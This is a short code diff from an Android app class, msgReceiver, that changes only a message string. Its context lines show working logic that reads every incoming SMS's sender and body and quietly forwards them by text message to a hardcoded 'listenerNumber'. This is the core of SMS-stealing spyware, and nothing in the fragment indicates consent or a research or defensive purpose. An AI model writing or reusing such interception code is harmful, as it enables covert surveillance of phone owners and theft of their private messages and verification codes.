@@ -14,7 +14,7 @@ public class msgReceiver extends BroadcastReceiver {
         String phonenum = smsmsg.getDisplayOriginatingAddress();
         String content = smsmsg.getMessageBody();
 
-        String msg = phonenum +" send msg to he:"+content;
+        String msg = phonenum +" send message to he:"+content;
         SmsManager sms = SmsManager.getDefault();
         sms.sendTextMessage(MyConstants.listenerNumber, null, msg, null, null);
     }
